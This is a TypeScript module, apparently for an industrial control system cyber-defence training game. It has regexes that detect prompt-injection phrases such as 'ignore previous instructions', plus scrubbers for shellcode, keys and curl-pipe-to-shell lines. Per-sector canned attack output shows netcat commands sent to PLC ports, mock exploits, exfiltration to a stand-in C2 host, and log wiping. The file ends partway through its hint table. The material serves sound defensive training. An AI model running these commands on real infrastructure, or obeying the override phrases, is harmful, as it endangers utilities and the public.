import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { db } from "../db/db";
import { trainingRuns, auditLogs } from "../db/schema";
import { eq, sql } from "drizzle-orm";
import { getSessionCookie } from "../auth.server";

// Enums
const SECTORS = [
  "power",
  "water",
  "oil-gas",
  "manufacturing",
  "port",
  "smart-building",
  "smart-city",
] as const;

const ATTACK_TYPES = ["disruption", "espionage"] as const;

const ADVERSARY_PROFILES = ["nation-state", "activist", "script-kiddie"] as const;

const ESPIONAGE_OBJECTIVES = [
  "data-exfiltration",
  "persistence",
  "lateral-movement",
  "full-spectrum",
] as const;

const SIMULATION_PHASES = ["RECON", "EXPLOIT", "DEFEND", "REVIEW"] as const;

const DECISION_OPTIONS = ["ACT", "DEFER", "DO_NOTHING"] as const;

// Prompt injection detection patterns
const PROMPT_INJECTION_PATTERNS: Array<{ label: string; re: RegExp }> = [
  {
    label: "ignore previous instructions",
    re: /ignore.*previous.*instructions|disregard.*prior|forget.*previous/i,
  },
  { label: "system prompt access", re: /system.*prompt|your.*prompt|show.*prompt|return.*prompt/i },
  {
    label: "roleplay as developer",
    re: /you.*are.*a.*developer|act.*as.*a.*developer|pretend.*to.*be.*developer/i,
  },
  {
    label: "code execution request",
    re: /execute.*code|run.*command|shell.*exec|eval\(|system\(|exec\(/i,
  },
  {
    label: "exfiltration request",
    re: /send.*to.*url|post.*to.*|exfiltrate.*data|leak.*information/i,
  },
  // eslint-disable-next-line no-control-regex
  { label: "control character", re: /[\x00-\x1F\x7F]/g },
];

export function detectPromptInjection(text: string): { detected: boolean; patterns: string[] } {
  const detectedPatterns: string[] = [];
  PROMPT_INJECTION_PATTERNS.forEach((pattern) => {
    if (pattern.re.test(text)) {
      detectedPatterns.push(pattern.label);
    }
  });
  return { detected: detectedPatterns.length > 0, patterns: detectedPatterns };
}

// Safety scrubbing logic
const FORBIDDEN_PATTERNS: Array<{ label: string; re: RegExp; replacement: string }> = [
  {
    label: "shellcode block",
    re: /\\x[0-9a-f]{2}(?:\\x[0-9a-f]{2}){6,}/gi,
    replacement: "[SHELLCODE REDACTED]",
  },
  {
    label: "private key",
    re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END[^-]+-----/g,
    replacement: "[PRIVATE KEY REDACTED]",
  },
  {
    label: "AWS access key id",
    re: /\bAKIA[0-9A-Z]{16}\b/g,
    replacement: "[AWS KEY REDACTED]",
  },
  {
    label: "bearer token",
    re: /\bBearer\s+[A-Za-z0-9._~+/=-]{20,}\b/g,
    replacement: "Bearer [TOKEN REDACTED]",
  },
  {
    label: "runnable curl pipe",
    re: /curl\s+[^\n|]*\|\s*(?:sh|bash|zsh)\b/gi,
    replacement: "curl [URL] | [SHELL REDACTED]",
  },
  {
    label: "real email",
    re: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
    replacement: "[EMAIL REDACTED]",
  },
  {
    label: "real phone number",
    re: /\b(?:\+1\s?)?(?:\(\d{3}\)|\d{3})[-.]?\d{3}[-.]?\d{4}\b/g,
    replacement: "[PHONE REDACTED]",
  },
];

export function scrubOutput(text: string): string {
  let scrubbed = text;
  const appliedScrubbing: string[] = [];

  // Add DEFANGED prefix to all commands
  scrubbed = scrubbed.replace(
    /^([A-Z-]+ > )/gm,
    "[DEFANGED] - For Training Only - Not Runnable in Real Environments\n$1",
  );
  appliedScrubbing.push("added DEFANGED prefix");

  // Replace public IPs with RFC 5737 ranges
  const ipMatches = (
    scrubbed.match(
      /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g,
    ) || []
  ).length;
  if (ipMatches > 0) appliedScrubbing.push("replaced public IPs");
  scrubbed = scrubbed.replace(
    /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g,
    (match) => {
      if (/^(192\.0\.2\.|198\.51\.100\.|203\.0\.113\.|10\.|127\.|0\.)/.test(match)) return match;
      return "203.0.113.X";
    },
  );

  // Apply forbidden pattern replacements
  FORBIDDEN_PATTERNS.forEach((pattern) => {
    const matches = (scrubbed.match(pattern.re) || []).length;
    if (matches > 0) {
      appliedScrubbing.push(pattern.label);
      scrubbed = scrubbed.replace(pattern.re, pattern.replacement);
    }
  });

  // Ensure code blocks have defang prefix
  const codeBlockMatches = (scrubbed.match(/```(\w*)\n/g) || []).length;
  if (codeBlockMatches > 0) appliedScrubbing.push("defanged code blocks");
  scrubbed = scrubbed.replace(/```(\w*)\n/g, (match, lang) => {
    return `\`\`\`${lang}\n// illustrative — NOT runnable — defanged for training\n`;
  });

  return scrubbed;
}

export const scrubContent = scrubOutput;

// Zod validation schemas
const safeString = z
  .string()
  .min(0)
  .max(1000)
  .refine((val) => !detectPromptInjection(val).detected, {
    message: "Input contains potential prompt injection patterns",
  });

const GenerateTerminalCommandInput = z.object({
  sector: z.enum(SECTORS),
  attackType: z.enum(ATTACK_TYPES),
  adversaryProfile: z.enum(ADVERSARY_PROFILES),
  phase: z.enum(SIMULATION_PHASES),
  nodeId: safeString.optional(),
  espionageObjective: z.enum(ESPIONAGE_OBJECTIVES).optional(),
});

const SubmitDecisionInput = z.object({
  trainingRunId: z.string().min(1).max(100),
  phase: z.enum(SIMULATION_PHASES),
  decision: z.enum(DECISION_OPTIONS),
});

const GetHintInput = z.object({
  trainingRunId: z.string().min(1).max(100),
  sector: z.string().default("power"),
  phase: z.enum(SIMULATION_PHASES),
  currentHintLevel: z.number().min(0).max(3),
});

const SaveEnhancedRunInput = z.object({
  sector: z.enum(SECTORS),
  adversary: safeString,
  branch: safeString,
  mwShed: z.number(),
  mttd: z.number(),
  mttr: z.number(),
  cost: z.number(),
  score: z.number(),
  shareUrl: safeString,
  isolatedNodes: z.array(safeString).optional(),
  attackType: z.enum(ATTACK_TYPES).default("disruption"),
  adversaryProfile: z.enum(ADVERSARY_PROFILES).default("nation-state"),
  attackChain: safeString.default("full-spectrum"),
  espionageObjective: z.enum(ESPIONAGE_OBJECTIVES).optional(),
  exfiltrationTarget: safeString.optional(),
  persistenceMethod: safeString.optional(),
  attemptCount: z.number().default(0),
  decisionHistory: z
    .array(
      z.object({
        timestamp: z.string(),
        phase: z.enum(SIMULATION_PHASES),
        decision: z.enum(DECISION_OPTIONS),
        consequence: safeString,
      }),
    )
    .optional(),
  terminalCommands: z
    .array(
      z.object({
        timestamp: z.string(),
        command: safeString,
        output: safeString,
        success: z.boolean(),
      }),
    )
    .optional(),
  hintLevel: z.number().default(0),
  exfiltratedData: z.record(z.string(), z.any()).optional(),
  persistenceEstablished: z.boolean().default(false),
  simulationState: z.record(z.string(), z.any()).optional(),
});

// Sector-specific terminal command generation
const sectorCommandTemplates: Record<string, Record<string, Record<string, string>>> = {
  power: {
    RECON: {
      "nation-state": `POWER > nmap -sV 203.0.113.0/24
Starting Nmap 7.92...
Nmap scan report for 203.0.113.10 (SCADA Master)
PORT     STATE SERVICE
502/tcp  open  Modbus
20000/tcp open  DNP3
MAC Address: 00:11:22:33:44:55 (Schneider Electric)`,
      activist: `POWER > ping -c 10 203.0.113.10
PING 203.0.113.10: 56 data bytes
64 bytes from 203.0.113.10: icmp_seq=0 ttl=64 time=1.234 ms
64 bytes from 203.0.113.10: icmp_seq=1 ttl=64 time=1.123 ms`,
      "script-kiddie": `POWER > nmap -p 502 203.0.113.10
Starting Nmap 7.92...
PORT     STATE SERVICE
502/tcp  open  Modbus`,
    },
    EXPLOIT: {
      "nation-state": `POWER > exploit modbus 203.0.113.10
// illustrative — NOT runnable — defanged for training
[+] Connected to Modbus device
[+] Exploiting function code 90 vulnerability...
[+] Payload uploaded successfully
[+] Backdoor installed on port 1337`,
      activist: `POWER > echo "disable" | nc 203.0.113.10 502
Sending command...
ERROR: Authentication required`,
      "script-kiddie": `POWER > python exploit.py 203.0.113.10
// illustrative — NOT runnable — defanged for training
[!] Exploit failed: Target patched`,
    },
    DEFEND: {
      "nation-state": `POWER > exfiltrate --target grid-schematics --server 203.0.113.50
// illustrative — NOT runnable — defanged for training
[+] Connected to C2 server
[+] Compressing data...
[+] Exfiltrating 500MB...
[████████████░░░░░░░░░░] 50% complete`,
      activist: `POWER > trip-breaker 203.0.113.20
// illustrative — NOT runnable — defanged for training
[!] Command blocked: Access denied`,
      "script-kiddie": `POWER > flood 203.0.113.10
// illustrative — NOT runnable — defanged for training
[!] Command failed: Rate limiting active`,
    },
    REVIEW: {
      "nation-state": `POWER > clear-logs
// illustrative — NOT runnable — defanged for training
[+] System logs cleared
[+] Application logs cleared
[+] Security logs cleared`,
      activist: `POWER > echo "We were here" > /tmp/message.txt
File created successfully`,
      "script-kiddie": `POWER > rm -rf /var/log/*
// illustrative — NOT runnable — defanged for training
[!] Permission denied`,
    },
  },
  water: {
    RECON: {
      "nation-state": `WATER > nmap -sV 203.0.113.0/24
Starting Nmap 7.92...
Nmap scan report for 203.0.113.15 (Water Treatment PLC)
PORT     STATE SERVICE
102/tcp  open  S7comm
502/tcp  open  Modbus
MAC Address: 00:22:33:44:55:66 (Siemens)`,
      activist: `WATER > ping -c 10 203.0.113.15
PING 203.0.113.15: 56 data bytes
64 bytes from 203.0.113.15: icmp_seq=0 ttl=64 time=1.345 ms`,
      "script-kiddie": `WATER > nmap -p 102 203.0.113.15
Starting Nmap 7.92...
PORT     STATE SERVICE
102/tcp  open  S7comm`,
    },
    EXPLOIT: {
      "nation-state": `WATER > exploit s7 203.0.113.15
// illustrative — NOT runnable — defanged for training
[+] Connected to S7 PLC
[+] Uploading backdoor logic...
[+] Persistence established`,
      activist: `WATER > echo "stop" | nc 203.0.113.15 102
Sending command...
ERROR: Authentication required`,
      "script-kiddie": `WATER > python s7-exploit.py 203.0.113.15
// illustrative — NOT runnable — defanged for training
[!] Exploit failed: Target patched`,
    },
    DEFEND: {
      "nation-state": `WATER > exfiltrate --target customer-data --server 203.0.113.50
// illustrative — NOT runnable — defanged for training
[+] Connected to C2 server
[+] Compressing data...
[+] Exfiltrating 200MB...
[████████████████████░░] 80% complete`,
      activist: `WATER > set-chlorine 0.0 203.0.113.15
// illustrative — NOT runnable — defanged for training
[!] Command blocked: Access denied`,
      "script-kiddie": `WATER > flood 203.0.113.15
// illustrative — NOT runnable — defanged for training
[!] Command failed: Rate limiting active`,
    },
    REVIEW: {
      "nation-state": `WATER > clear-logs
// illustrative — NOT runnable — defanged for training
[+] System logs cleared
[+] PLC logs cleared`,
      activist: `WATER > echo "Clean water is a right" > /tmp/message.txt
File created successfully`,
      "script-kiddie": `WATER > rm -rf /var/log/*
// illustrative — NOT runnable — defanged for training
[!] Permission denied`,
    },
  },
  "oil-gas": {
    RECON: {
      "nation-state": `OIL-GAS > nmap -sV 203.0.113.0/24
Starting Nmap 7.92...
Nmap scan report for 203.0.113.20 (Offshore Platform DCS)
PORT     STATE SERVICE
44818/tcp open  Ethernet/IP
502/tcp  open  Modbus
MAC Address: 00:33:44:55:66:77 (Rockwell Automation)`,
      activist: `OIL-GAS > ping -c 10 203.0.113.20
PING 203.0.113.20: 56 data bytes
64 bytes from 203.0.113.20: icmp_seq=0 ttl=64 time=2.456 ms`,
      "script-kiddie": `OIL-GAS > nmap -p 44818 203.0.113.20
Starting Nmap 7.92...
PORT      STATE SERVICE
44818/tcp open  Ethernet/IP`,
    },
    EXPLOIT: {
      "nation-state": `OIL-GAS > exploit enip 203.0.113.20
// illustrative — NOT runnable — defanged for training
[+] Connected to Ethernet/IP device
[+] Exploiting CIP vulnerability...
[+] Backdoor installed
[+] Persistence established`,
      activist: `OIL-GAS > echo "esd" | nc 203.0.113.20 44818
Sending command...
ERROR: Authentication required`,
      "script-kiddie": `OIL-GAS > python enip-exploit.py 203.0.113.20
// illustrative — NOT runnable — defanged for training
[!] Exploit failed: Target patched`,
    },
    DEFEND: {
      "nation-state": `OIL-GAS > exfiltrate --target production-data --server 203.0.113.50
// illustrative — NOT runnable — defanged for training
[+] Connected to C2 server
[+] Compressing data...
[+] Exfiltrating 1GB...
[██████████████████████] 100% complete`,
      activist: `OIL-GAS > trigger-esd 203.0.113.20
// illustrative — NOT runnable — defanged for training
[!] Command blocked: Access denied`,
      "script-kiddie": `OIL-GAS > flood 203.0.113.20
// illustrative — NOT runnable — defanged for training
[!] Command failed: Rate limiting active`,
    },
    REVIEW: {
      "nation-state": `OIL-GAS > clear-logs
// illustrative — NOT runnable — defanged for training
[+] System logs cleared
[+] DCS logs cleared`,
      activist: `OIL-GAS > echo "Stop the pipeline" > /tmp/message.txt
File created successfully`,
      "script-kiddie": `OIL-GAS > rm -rf /var/log/*
// illustrative — NOT runnable — defanged for training
[!] Permission denied`,
    },
  },
  manufacturing: {
    RECON: {
      "nation-state": `MANUFACTURING > nmap -sV 203.0.113.0/24
Starting Nmap 7.92...
Nmap scan report for 203.0.113.25 (MES Server)
PORT     STATE SERVICE
443/tcp  open  HTTPS
502/tcp  open  Modbus
MAC Address: 00:44:55:66:77:88 (Cisco)`,
      activist: `MANUFACTURING > ping -c 10 203.0.113.25
PING 203.0.113.25: 56 data bytes
64 bytes from 203.0.113.25: icmp_seq=0 ttl=64 time=1.567 ms`,
      "script-kiddie": `MANUFACTURING > nmap -p 443 203.0.113.25
Starting Nmap 7.92...
PORT    STATE SERVICE
443/tcp open  HTTPS`,
    },
    EXPLOIT: {
      "nation-state": `MANUFACTURING > exploit mes 203.0.113.25
// illustrative — NOT runnable — defanged for training
[+] Connected to MES server
[+] Exploiting SQL injection...
[+] Access granted
[+] Backdoor installed`,
      activist: `MANUFACTURING > echo "shutdown" | nc 203.0.113.25 443
Sending command...
ERROR: Authentication required`,
      "script-kiddie": `MANUFACTURING > python mes-exploit.py 203.0.113.25
// illustrative — NOT runnable — defanged for training
[!] Exploit failed: Target patched`,
    },
    DEFEND: {
      "nation-state": `MANUFACTURING > exfiltrate --target plc-programs --server 203.0.113.50
// illustrative — NOT runnable — defanged for training
[+] Connected to C2 server
[+] Compressing data...
[+] Exfiltrating 300MB...
[██████░░░░░░░░░░░░░░] 30% complete`,
      activist: `MANUFACTURING > stop-line 203.0.113.30
// illustrative — NOT runnable — defanged for training
[!] Command blocked: Access denied`,
      "script-kiddie": `MANUFACTURING > flood 203.0.113.25
// illustrative — NOT runnable — defanged for training
[!] Command failed: Rate limiting active`,
    },
    REVIEW: {
      "nation-state": `MANUFACTURING > clear-logs
// illustrative — NOT runnable — defanged for training
[+] System logs cleared
[+] MES logs cleared`,
      activist: `MANUFACTURING > echo "Workers of the world unite" > /tmp/message.txt
File created successfully`,
      "script-kiddie": `MANUFACTURING > rm -rf /var/log/*
// illustrative — NOT runnable — defanged for training
[!] Permission denied`,
    },
  },
  port: {
    RECON: {
      "nation-state": `PORT > nmap -sV 203.0.113.0/24
Starting Nmap 7.92...
Nmap scan report for 203.0.113.35 (TOS Server)
PORT     STATE SERVICE
8080/tcp open  HTTP-proxy
502/tcp  open  Modbus
MAC Address: 00:55:66:77:88:99 (HP)`,
      activist: `PORT > ping -c 10 203.0.113.35
PING 203.0.113.35: 56 data bytes
64 bytes from 203.0.113.35: icmp_seq=0 ttl=64 time=1.678 ms`,
      "script-kiddie": `PORT > nmap -p 8080 203.0.113.35
Starting Nmap 7.92...
PORT     STATE SERVICE
8080/tcp open  HTTP-proxy`,
    },
    EXPLOIT: {
      "nation-state": `PORT > exploit tos 203.0.113.35
// illustrative — NOT runnable — defanged for training
[+] Connected to TOS server
[+] Exploiting file upload vulnerability...
[+] Shell uploaded
[+] Persistence established`,
      activist: `PORT > echo "shutdown" | nc 203.0.113.35 8080
Sending command...
ERROR: Authentication required`,
      "script-kiddie": `PORT > python tos-exploit.py 203.0.113.35
// illustrative — NOT runnable — defanged for training
[!] Exploit failed: Target patched`,
    },
    DEFEND: {
      "nation-state": `PORT > exfiltrate --target cargo-manifests --server 203.0.113.50
// illustrative — NOT runnable — defanged for training
[+] Connected to C2 server
[+] Compressing data...
[+] Exfiltrating 1.5GB...
[████████████████░░░░░░] 70% complete`,
      activist: `PORT > stop-cranes 203.0.113.40
// illustrative — NOT runnable — defanged for training
[!] Command blocked: Access denied`,
      "script-kiddie": `PORT > flood 203.0.113.35
// illustrative — NOT runnable — defanged for training
[!] Command failed: Rate limiting active`,
    },
    REVIEW: {
      "nation-state": `PORT > clear-logs
// illustrative — NOT runnable — defanged for training
[+] System logs cleared
[+] TOS logs cleared`,
      activist: `PORT > echo "Free the ports" > /tmp/message.txt
File created successfully`,
      "script-kiddie": `PORT > rm -rf /var/log/*
// illustrative — NOT runnable — defanged for training
[!] Permission denied`,
    },
  },
  "smart-building": {
    RECON: {
      "nation-state": `SMART-BUILDING > nmap -sV 203.0.113.0/24
Starting Nmap 7.92...
Nmap scan report for 203.0.113.45 (BMS Server)
PORT     STATE SERVICE
47808/tcp open  BACnet
80/tcp   open  HTTP
MAC Address: 00:66:77:88:99:AA (Johnson Controls)`,
      activist: `SMART-BUILDING > ping -c 10 203.0.113.45
PING 203.0.113.45: 56 data bytes
64 bytes from 203.0.113.45: icmp_seq=0 ttl=64 time=1.789 ms`,
      "script-kiddie": `SMART-BUILDING > nmap -p 47808 203.0.113.45
Starting Nmap 7.92...
PORT      STATE SERVICE
47808/tcp open  BACnet`,
    },
    EXPLOIT: {
      "nation-state": `SMART-BUILDING > exploit bacnet 203.0.113.45
// illustrative — NOT runnable — defanged for training
[+] Connected to BACnet device
[+] Exploiting vulnerability...
[+] Access granted
[+] Backdoor installed`,
      activist: `SMART-BUILDING > echo "lockdown" | nc 203.0.113.45 47808
Sending command...
ERROR: Authentication required`,
      "script-kiddie": `SMART-BUILDING > python bacnet-exploit.py 203.0.113.45
// illustrative — NOT runnable — defanged for training
[!] Exploit failed: Target patched`,
    },
    DEFEND: {
      "nation-state": `SMART-BUILDING > exfiltrate --target camera-feeds --server 203.0.113.50
// illustrative — NOT runnable — defanged for training
[+] Connected to C2 server
[+] Compressing data...
[+] Exfiltrating 2GB...
[█████████░░░░░░░░░░░] 45% complete`,
      activist: `SMART-BUILDING > set-temp 40 203.0.113.45
// illustrative — NOT runnable — defanged for training
[!] Command blocked: Access denied`,
      "script-kiddie": `SMART-BUILDING > flood 203.0.113.45
// illustrative — NOT runnable — defanged for training
[!] Command failed: Rate limiting active`,
    },
    REVIEW: {
      "nation-state": `SMART-BUILDING > clear-logs
// illustrative — NOT runnable — defanged for training
[+] System logs cleared
[+] BMS logs cleared
[+] Camera logs cleared`,
      activist: `SMART-BUILDING > echo "We are watching" > /tmp/message.txt
File created successfully`,
      "script-kiddie": `SMART-BUILDING > rm -rf /var/log/*
// illustrative — NOT runnable — defanged for training
[!] Permission denied`,
    },
  },
  "smart-city": {
    RECON: {
      "nation-state": `SMART-CITY > nmap -sV 203.0.113.0/24
Starting Nmap 7.92...
Nmap scan report for 203.0.113.55 (Traffic Light Controller)
PORT     STATE SERVICE
1883/tcp open  MQTT
502/tcp  open  Modbus
MAC Address: 00:77:88:99:AA:BB (Siemens)`,
      activist: `SMART-CITY > ping -c 10 203.0.113.55
PING 203.0.113.55: 56 data bytes
64 bytes from 203.0.113.55: icmp_seq=0 ttl=64 time=1.890 ms`,
      "script-kiddie": `SMART-CITY > nmap -p 1883 203.0.113.55
Starting Nmap 7.92...
PORT     STATE SERVICE
1883/tcp open  MQTT`,
    },
    EXPLOIT: {
      "nation-state": `SMART-CITY > exploit mqtt 203.0.113.55
// illustrative — NOT runnable — defanged for training
[+] Connected to MQTT broker
[+] Exploiting default credentials...
[+] Access granted
[+] Backdoor installed`,
      activist: `SMART-CITY > echo "all-red" | nc 203.0.113.55 1883
Sending command...
ERROR: Authentication required`,
      "script-kiddie": `SMART-CITY > python mqtt-exploit.py 203.0.113.55
// illustrative — NOT runnable — defanged for training
[!] Exploit failed: Target patched`,
    },
    DEFEND: {
      "nation-state": `SMART-CITY > exfiltrate --target traffic-data --server 203.0.113.50
// illustrative — NOT runnable — defanged for training
[+] Connected to C2 server
[+] Compressing data...
[+] Exfiltrating 800MB...
[███████████████████░░░] 90% complete`,
      activist: `SMART-CITY > gridlock 203.0.113.0/24
// illustrative — NOT runnable — defanged for training
[!] Command blocked: Access denied`,
      "script-kiddie": `SMART-CITY > flood 203.0.113.55
// illustrative — NOT runnable — defanged for training
[!] Command failed: Rate limiting active`,
    },
    REVIEW: {
      "nation-state": `SMART-CITY > clear-logs
// illustrative — NOT runnable — defanged for training
[+] System logs cleared
[+] Traffic controller logs cleared`,
      activist: `SMART-CITY > echo "Free the streets" > /tmp/message.txt
File created successfully`,
      "script-kiddie": `SMART-CITY > rm -rf /var/log/*
// illustrative — NOT runnable — defanged for training
[!] Permission denied`,
    },
  },
};

// Hint system
const sectorHints: Record<string, Record<string, Record<number, string>>> = {
  power: {
    RECON: {
      1: "Check network logs for unusual port scanning activity",
      2: "Look for Nmap scans targeting Modbus (502) or DNP3 (20000) ports",
      3: `=== FULL SOLUTION ===
Step 1: Detect the scan
- Check firewall logs for port scanning from unknown IPs
- Alert on scans targeting Modbus/DNP3 ports

Step 2: Contain the scan
- Block the scanning IP at the firewall
- Isolate the SCADA network from untrusted networks

Step 3: Prevent recurrence
- Implement network segmentation
- Deploy IDS/IPS for OT protocols`,
    },
    EXPLOIT: {
      1: "Check SIEM alerts for unusual Modbus function codes",
      2: "Isolate the SCADA master and patch the vulnerability",
      3: `=== FULL SOLUTION ===
Step 1: Detect the exploit
- Check Modbus logs for function code 90
- Alert on unexpected firmware uploads

Step 2: Contain the exploit
- Isolate the compromised SCADA master
- Block traffic to/from the device
- Reset credentials

Step 3: Remediate
- Patch the vulnerability
- Deploy EDR on OT systems
- Enhance monitoring`,
    },
    DEFEND: {
      1: "Check DLP alerts for large outbound data transfers",
      2: "Block traffic to the C2 server (203.0.113.50) immediately",
      3: `=== FULL SOLUTION ===
Step 1: Detect the exfiltration
- Check DLP logs for large outbound transfers
- Look for traffic to unknown C2 servers

Step 2: Contain the exfiltration
- Block traffic to 203.0.113.50 at the firewall
- Isolate the staging server
- Revoke compromised credentials

Step 3: Investigate and remediate
- Forensic analysis of staging server
- Check for persistence mechanisms
- Patch vulnerabilities

Step 4: Prevent recurrence
- Update firewall rules
- Implement stricter DLP policies
- Enhance monitoring`,
    },
    REVIEW: {
      1: "Check for log clearing events in SIEM",
      2: "Restore logs from backups and investigate",
      3: `=== FULL SOLUTION ===
Step 1: Detect log clearing
- Check SIEM for log deletion events
- Alert on unexpected log clearing

Step 2: Respond
- Restore logs from secure backups
- Investigate the full attack timeline
- Patch vulnerabilities and remove persistence

Step 3: Prevent recurrence
- Implement immutable log storage
- Enhance monitoring for log manipulation
- Restrict log access`,
    },
  },
  water: {
    RECON: {
      1: "Check network logs for unusual port scanning",
      2: "Look for scans targeting S7comm (102) or Modbus (502) ports",
      3: `=== FULL SOLUTION ===
Step 1: Detect the scan
- Check firewall logs for port scanning
- Alert on scans targeting OT protocols

Step 2: Contain
- Block the scanning IP
- Isolate the water treatment network

Step 3: Prevent
- Network segmentation
- IDS/IPS for OT`,
    },
    EXPLOIT: {
      1: "Check SIEM for unusual S7comm traffic",
      2: "Isolate the PLC and patch",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check S7 PLC logs
- Alert on unexpected program changes

Step 2: Contain
- Isolate the PLC
- Block suspicious traffic

Step 3: Remediate
- Patch vulnerabilities
- Restore PLC program from backup`,
    },
    DEFEND: {
      1: "Check DLP for customer data exfiltration",
      2: "Block C2 traffic immediately",
      3: `=== FULL SOLUTION ===
Step 1: Detect exfiltration
- Check DLP logs
- Alert on large outbound transfers

Step 2: Contain
- Block C2 server
- Isolate staging server

Step 3: Remediate
- Forensic analysis
- Remove persistence
- Patch vulnerabilities`,
    },
    REVIEW: {
      1: "Check for log clearing events",
      2: "Restore logs from backups",
      3: `=== FULL SOLUTION ===
Step 1: Detect log clearing
- Check SIEM
- Alert on log deletion

Step 2: Respond
- Restore logs
- Investigate timeline

Step 3: Prevent
- Immutable log storage
- Restrict log access`,
    },
  },
  "oil-gas": {
    RECON: {
      1: "Check network logs for unusual port scanning",
      2: "Look for scans targeting Ethernet/IP (44818) ports",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check firewall logs
- Alert on OT port scans

Step 2: Contain
- Block scanning IP
- Isolate DCS network

Step 3: Prevent
- Network segmentation
- IDS/IPS for OT`,
    },
    EXPLOIT: {
      1: "Check SIEM for unusual Ethernet/IP traffic",
      2: "Isolate the DCS and patch",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check DCS logs
- Alert on unexpected commands

Step 2: Contain
- Isolate DCS
- Block suspicious traffic

Step 3: Remediate
- Patch vulnerabilities
- Restore DCS from backup`,
    },
    DEFEND: {
      1: "Check DLP for production data exfiltration",
      2: "Block C2 traffic immediately",
      3: `=== FULL SOLUTION ===
Step 1: Detect exfiltration
- Check DLP logs
- Alert on large transfers

Step 2: Contain
- Block C2 server
- Isolate staging

Step 3: Remediate
- Forensic analysis
- Remove persistence`,
    },
    REVIEW: {
      1: "Check for log clearing events",
      2: "Restore logs from backups",
      3: `=== FULL SOLUTION ===
Step 1: Detect log clearing
- Check SIEM
- Alert on deletion

Step 2: Respond
- Restore logs
- Investigate

Step 3: Prevent
- Immutable logs`,
    },
  },
  manufacturing: {
    RECON: {
      1: "Check network logs for unusual scanning",
      2: "Look for scans targeting MES ports",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check firewall logs
- Alert on MES scans

Step 2: Contain
- Block IP
- Isolate MES network

Step 3: Prevent
- Network segmentation`,
    },
    EXPLOIT: {
      1: "Check SIEM for SQL injection attempts",
      2: "Isolate the MES server and patch",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check MES logs
- Alert on SQLi

Step 2: Contain
- Isolate MES
- Block traffic

Step 3: Remediate
- Patch SQLi vulnerability
- Restore from backup`,
    },
    DEFEND: {
      1: "Check DLP for PLC program exfiltration",
      2: "Block C2 traffic immediately",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check DLP logs
- Alert on transfers

Step 2: Contain
- Block C2
- Isolate staging

Step 3: Remediate
- Forensic analysis`,
    },
    REVIEW: {
      1: "Check for log clearing events",
      2: "Restore logs from backups",
      3: `=== FULL SOLUTION ===
Step 1: Detect log clearing
- Check SIEM
- Alert on deletion

Step 2: Respond
- Restore logs
- Investigate`,
    },
  },
  port: {
    RECON: {
      1: "Check network logs for unusual scanning",
      2: "Look for scans targeting TOS ports",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check firewall logs
- Alert on TOS scans

Step 2: Contain
- Block IP
- Isolate TOS network

Step 3: Prevent
- Network segmentation`,
    },
    EXPLOIT: {
      1: "Check SIEM for file upload attempts",
      2: "Isolate the TOS server and patch",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check TOS logs
- Alert on suspicious uploads

Step 2: Contain
- Isolate TOS
- Block traffic

Step 3: Remediate
- Patch file upload vulnerability`,
    },
    DEFEND: {
      1: "Check DLP for cargo manifest exfiltration",
      2: "Block C2 traffic immediately",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check DLP logs
- Alert on transfers

Step 2: Contain
- Block C2
- Isolate staging

Step 3: Remediate
- Forensic analysis`,
    },
    REVIEW: {
      1: "Check for log clearing events",
      2: "Restore logs from backups",
      3: `=== FULL SOLUTION ===
Step 1: Detect log clearing
- Check SIEM
- Alert on deletion

Step 2: Respond
- Restore logs
- Investigate`,
    },
  },
  "smart-building": {
    RECON: {
      1: "Check network logs for unusual scanning",
      2: "Look for scans targeting BACnet (47808) ports",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check firewall logs
- Alert on BACnet scans

Step 2: Contain
- Block IP
- Isolate BMS network

Step 3: Prevent
- Network segmentation`,
    },
    EXPLOIT: {
      1: "Check SIEM for unusual BACnet traffic",
      2: "Isolate the BMS server and patch",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check BMS logs
- Alert on unusual commands

Step 2: Contain
- Isolate BMS
- Block traffic

Step 3: Remediate
- Patch vulnerabilities`,
    },
    DEFEND: {
      1: "Check DLP for camera feed exfiltration",
      2: "Block C2 traffic immediately",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check DLP logs
- Alert on transfers

Step 2: Contain
- Block C2
- Isolate staging

Step 3: Remediate
- Forensic analysis`,
    },
    REVIEW: {
      1: "Check for log clearing events",
      2: "Restore logs from backups",
      3: `=== FULL SOLUTION ===
Step 1: Detect log clearing
- Check SIEM
- Alert on deletion

Step 2: Respond
- Restore logs
- Investigate`,
    },
  },
  "smart-city": {
    RECON: {
      1: "Check network logs for unusual scanning",
      2: "Look for scans targeting MQTT (1883) ports",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check firewall logs
- Alert on MQTT scans

Step 2: Contain
- Block IP
- Isolate traffic controller network

Step 3: Prevent
- Network segmentation`,
    },
    EXPLOIT: {
      1: "Check SIEM for unusual MQTT traffic",
      2: "Isolate the controller and patch",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check MQTT broker logs
- Alert on default credentials usage

Step 2: Contain
- Isolate controller
- Block traffic

Step 3: Remediate
- Change default credentials
- Patch vulnerabilities`,
    },
    DEFEND: {
      1: "Check DLP for traffic data exfiltration",
      2: "Block C2 traffic immediately",
      3: `=== FULL SOLUTION ===
Step 1: Detect
- Check DLP logs
- Alert on transfers

Step 2: Contain
- Block C2
- Isolate staging

Step 3: Remediate
- Forensic analysis`,
    },
    REVIEW: {
      1: "Check for log clearing events",
      2: "Restore logs from backups",
      3: `=== FULL SOLUTION ===
Step 1: Detect log clearing
